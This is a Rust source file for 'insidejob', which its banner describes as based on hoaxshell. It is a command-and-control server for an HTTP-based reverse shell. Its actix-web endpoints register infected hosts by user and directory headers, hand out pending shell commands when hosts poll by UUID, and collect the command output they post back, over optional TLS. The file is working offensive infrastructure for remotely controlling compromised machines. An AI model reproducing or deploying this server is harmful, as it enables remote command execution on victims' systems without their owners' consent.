mod session;
mod storage;

use std::borrow::Cow;
use std::collections::HashMap;
use std::string::FromUtf8Error;
use std::sync::{RwLock, RwLockReadGuard, RwLockWriteGuard};
use clap::Parser;
use log::{error, info, trace, warn};
use crate::session::{Command, Session};
use crate::storage::SessionStore;

static LOGO: &'static str = "
            ┌───┐
──┬── ┬┐  ┬ │   │ ──┬── ┬──┐  ┬───┐           ┬ ┌───┐ ┬──┐
  │   │└┐ │ │   ┴   │   │  └┐ │               │ │   │ │  │
  │   │ │ │ └───┐   │   │   │ ┼──┼   ───      │ │   │ ┼──┴┐
  │   │ └┐│ ┬   │   │   │  ┌┘ │           ┬   │ │   │ │   │
──┴── ┴  └┴ │   │ ──┴── ┴──┘  ┴───┘       └───┘ └───┘ ┴───┘
            └───┘                           made by cauvmou
                                         based on hoaxshell

";

#[derive(clap::Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value = "0.0.0.0")]
    address: std::net::Ipv4Addr,
    #[arg(short, long, default_value_t = 4132)]
    port: u16,
    #[arg(
        short,
        long,
        value_name = "FILE",
        requires = "cert",
        help = "TLS key for HTTPS, must be PEM format."
    )]
    key: Option<std::path::PathBuf>,
    #[arg(
        short,
        long,
        value_name = "FILE",
        requires = "key",
        help = "TLS cert for HTTPS, must be PEM format."
    )]
    cert: Option<std::path::PathBuf>,
}

// pub struct Application {
//     pub sessions: HashMap<Uuid, Session>,
//     pub secure: bool,
//     pub port: usize,
// }
//
// impl Default for Application {
//     fn default() -> Self {
//         Self { sessions: HashMap::new(), secure: false, port: 8080 }
//     }
// }

#[actix_web::get("/")]
async fn index(req: actix_web::HttpRequest, session_store: actix_web::web::Data<SessionStore>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(user), Ok(directory)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let uuid = uuid::Uuid::new_v4();
            info!("new client ({uuid}) with user: {user}");
            let session = Session {
                uuid: uuid.as_u128(),
                last_seen: std::time::SystemTime::now(),
                status: session::Status::Active,
                metadata: session::SessionData {
                    user,
                    directory,
                },
            };
            match (session_store.sessions.write().ok(), session_store.commands.write().ok(), session_store.session_lock.write().ok()) {
                (Some(mut sessions), Some(mut commands), Some(mut lock)) => {
                    sessions.insert(uuid.as_u128(), RwLock::new(session));
                    commands.insert(uuid.as_u128(), RwLock::new(vec![]));
                    lock.insert(uuid.as_u128(), RwLock::new(None));
                }
                _ => {
                    return actix_web::HttpResponse::InternalServerError().finish()
                }
            }
            return actix_web::HttpResponse::Ok().body(uuid.to_string());
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::get("/{uuid}")]
async fn cmd_input(path: actix_web::web::Path<(String,)>, req: actix_web::HttpRequest, session_store: actix_web::web::Data<SessionStore>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(_), Ok(_)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            let Some(commands) = session_store.session_lock.read().ok() else {
                warn!("failed to acquire read lock for session_locks");
                return actix_web::HttpResponse::InternalServerError().finish();
            };
            let Some(Some(pending_command)) = commands.get(&uuid.as_u128()).map(|e| e.read().ok()) else {
                warn!("failed to acquire read lock for pending session command");
                return actix_web::HttpResponse::InternalServerError().finish();
            };
            let command = pending_command.clone().unwrap_or("".to_string());
            if pending_command.is_some() {
                trace!("sending command {command:?} to host on session: {}", uuid.to_string());
            }
            return actix_web::HttpResponse::Ok().body(command);
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::post("/{uuid}")]
async fn cmd_output(path: actix_web::web::Path<(String,), >, bytes: actix_web::web::Bytes, req: actix_web::HttpRequest, session_store: actix_web::web::Data<SessionStore>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(user), Ok(directory)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            let Some(session_lock) = session_store.session_lock.read().ok() else {
                warn!("failed to acquire read lock for session_locks");
                return actix_web::HttpResponse::InternalServerError().finish();
            };
            let Some(pending_command) = session_lock.get(&uuid.as_u128()) else {
                warn!("failed to get pending session command");
                return actix_web::HttpResponse::InternalServerError().finish();
            };
            let Some(mut pending) = pending_command.write().ok() else {
                error!("client sent an unexpected command output, no command was pending!");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            let Some(input) = pending.clone() else {
                error!("client sent an unexpected command output, no command was pending!");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            *pending = None;

            let Some(sessions) = session_store.sessions.read().ok() else {
                warn!("failed to acquire read lock for session_locks");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            let Some(session) = sessions.get(&uuid.as_u128()) else {
                warn!("failed to get session");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            let Some(mut session) = session.write().ok() else {
                warn!("failed to acquire write lock for session");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            session.metadata.user = user.to_owned();
            session.metadata.directory = directory.to_owned();

            let output = match String::from_utf8(bytes.to_vec()) {
                Ok(string) => string,
                Err(err) => {
                    error!("failed to convert bytes to string: {err}");
                    return actix_web::HttpResponse::BadRequest().finish();
                }
            };

            let command = Command {
                timestamp: std::time::SystemTime::now(),
                input,
                output,
            };

            let Some(commands) = session_store.commands.read().ok() else {
                warn!("failed to acquire read lock for commands");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            let Some(commands) = commands.get(&uuid.as_u128()) else {
                warn!("failed to get for commands");
                return actix_web::HttpResponse::InternalServerError().finish();
            };

            let Some(mut commands) = commands.write().ok() else {
                warn!("failed to acquire write lock for commands");
                return actix_web::HttpResponse::InternalServerError().finish();
            };
            commands.push(command);

            return actix_web::HttpResponse::Ok().finish();
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let args = Args::parse();
    simple_logger::SimpleLogger::new()
        .with_level(log::LevelFilter::Warn)
        .with_module_level("insidejob", log::LevelFilter::Info)
        .init().expect("Failed to start logger!");
    println!("{LOGO}");

    let mut server = actix_web::HttpServer::new(|| {
        actix_web::App::new()
            .app_data(actix_web::web::Data::new(SessionStore::default()))
            .service(index)
            .service(cmd_input)
            .service(cmd_output)
    });

    let server_binding = if let (Some(key), Some(cert)) = (args.key, args.cert) {
        info!("using TLS key from {key:?}, and cert from {cert:?}...");
        let mut builder = openssl::ssl::SslAcceptor::mozilla_intermediate(openssl::ssl::SslMethod::tls()).unwrap();
        builder.set_private_key_file(key, openssl::ssl::SslFiletype::PEM).unwrap();
        builder.set_certificate_chain_file(cert)?;
        server.bind_openssl((args.address, args.port), builder)
    } else {
        info!("no TLS key/cert specified, starting in HTTP only mode!");
        server.bind((args.address, args.port))
    };

    match server_binding {
        Ok(server) => {
            server.addrs_with_scheme().iter().for_each(|(addr, scheme)| info!("listening on: {scheme}://{addr}"));
            server.run().await?;
        }
        Err(err) => {
            error!("{err}");
        }
    }
    Ok(())
}